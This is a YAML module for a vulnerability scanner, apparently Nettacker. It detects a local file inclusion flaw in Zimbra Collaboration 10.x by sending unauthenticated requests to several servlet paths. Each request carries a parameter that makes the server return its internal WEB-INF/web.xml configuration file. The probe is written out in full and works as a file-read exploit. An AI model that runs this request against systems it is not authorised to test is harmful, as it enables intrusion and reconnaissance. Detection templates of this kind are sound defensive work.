info:
  name: zimbra_cve_2025_68645_vuln
  author: Sankalp Bansal
  severity: 8.8
  description: >
    Zimbra Collaboration (ZCS) 10.0 and 10.1 contain a local file inclusion
    vulnerability caused by improper handling of user-supplied parameters
    in the RestFilter servlet. This allows unauthenticated remote attackers
    to include arbitrary files from the WebRoot.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-68645
  profiles:
    - vuln
    - http
    - high_severity
    - cve
    - cve2025
    - zimbra
    - cisa_kev

payloads:
  - library: http
    steps:
      - method: get
        timeout: 3
        headers:
          User-Agent: "{user_agent}"
        ssl: false
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}?javax.servlet.include.servlet_path=/WEB-INF/web.xml"
            data:
              schema:
                - "https"
                - "http"
              ports:
                - 8443
                - 8080
                - 443
                - 80
                - 7071
              paths:
                - "h/rest"
                - "h/changepass"
                - "h/imessage"
                - "h/postLoginRedirect"
                - "h/printcalls"
                - "h/printcalendar"
                - "h/printvoicemails"
                - "h/printappointments"
                - "h/printcontacts"
                - "h/printconversations"
                - "h/printmessage"
                - "h/printtasks"
                - "h/viewimages"
        response:
          condition_type: and
          conditions:
            status_code:
              regex: "200"
              reverse: false
            content:
              regex: "(?s)<\\?xml version.*?<web-app.*Zimbra"
              reverse: false
